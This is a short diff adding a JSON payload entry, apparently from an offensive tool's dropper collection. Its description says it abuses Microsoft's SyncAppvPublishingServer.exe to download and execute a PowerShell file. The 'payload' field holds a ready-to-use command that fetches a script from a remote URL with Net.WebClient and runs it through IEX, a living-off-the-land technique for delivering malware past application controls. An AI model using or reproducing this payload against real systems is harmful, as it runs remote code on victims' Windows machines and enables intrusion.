@@ -1,0 +1,10 @@
+{
+  "data": {
+    "information": {
+      "description": "uses Microsoft SyncAppvPublishingServer to download and execute a powershell file",
+      "type": "dropper",
+      "exec": "batch"
+    },
+    "payload": "SyncAppvPublishingServer.exe \"n;((New-Object Net.WebClient).DownloadString('[URL]') | IEX"
+  }
+}
